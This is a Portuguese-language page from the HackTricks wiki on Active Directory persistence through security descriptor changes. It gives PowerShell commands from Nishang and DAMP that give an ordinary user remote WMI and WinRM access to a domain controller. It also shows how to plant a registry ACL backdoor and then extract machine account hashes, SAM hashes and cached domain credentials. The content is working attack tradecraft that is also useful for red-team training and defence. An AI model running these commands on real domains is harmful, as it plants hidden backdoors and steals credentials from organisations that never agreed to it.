# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

[From the docs](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): A Linguagem de Definição de Descritor de Segurança (SDDL) define o formato que é usado para descrever um descritor de segurança. SDDL usa strings ACE para DACL e SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`

Os **descritores de segurança** são usados para **armazenar** as **permissões** que um **objeto** tem **sobre** um **objeto**. Se você puder **fazer** uma **pequena alteração** no **descritor de segurança** de um objeto, poderá obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.

Então, essa técnica de persistência é baseada na capacidade de obter todos os privilégios necessários contra certos objetos, para poder realizar uma tarefa que geralmente requer privilégios de administrador, mas sem a necessidade de ser administrador.

### Access to WMI

Você pode dar a um usuário acesso para **executar remotamente WMI** [**usando isso**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1):
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Acesso ao WinRM

Dê acesso ao **console PS do winrm a um usuário** [**usando isso**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Acesso remoto a hashes

Acesse o **registro** e **extraia hashes** criando um **backdoor de registro usando** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** para que você possa a qualquer momento recuperar o **hash do computador**, o **SAM** e qualquer **credencial AD** em cache no computador. Portanto, é muito útil conceder essa permissão a um **usuário regular contra um computador Controlador de Domínio**:
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Verifique [**Silver Tickets**](silver-ticket.md) para aprender como você pode usar o hash da conta do computador de um Controlador de Domínio.

{{#include ../../banners/hacktricks-training.md}}
